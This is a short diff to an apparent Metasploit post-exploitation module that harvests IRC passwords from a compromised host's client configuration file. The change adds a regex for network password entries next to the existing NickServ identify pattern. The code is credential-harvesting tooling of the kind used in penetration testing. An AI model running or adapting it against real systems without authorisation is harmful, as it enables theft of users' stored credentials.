@@ -40,14 +40,21 @@ class MetasploitModule < Msf::Post
 
   # Example of what we're looking for in the config...
   #
+  # ***Identify Password Example***
   # autosendcmd = "/msg nickserv identify example_password ;wait 2000";
+  # 
+  # ***Network Password Example***
+  #    password = "example_password";
   #
   def extract_passwords(path)
     data = read_file(path)
-    passwords = data.scan(/\/\^?msg nickserv identify ([^\s]+)/)
+    identify_passwords = data.scan(/\/\^?msg nickserv identify ([^\s]+)/)
+    network_passwords = data.scan(/^?password = "([^\s]+)"/)
+
+    passwords = identify_passwords.flatten + network_passwords.flatten
 
     if passwords.any?
-      return passwords.flatten
+      return passwords
     end
 
     []
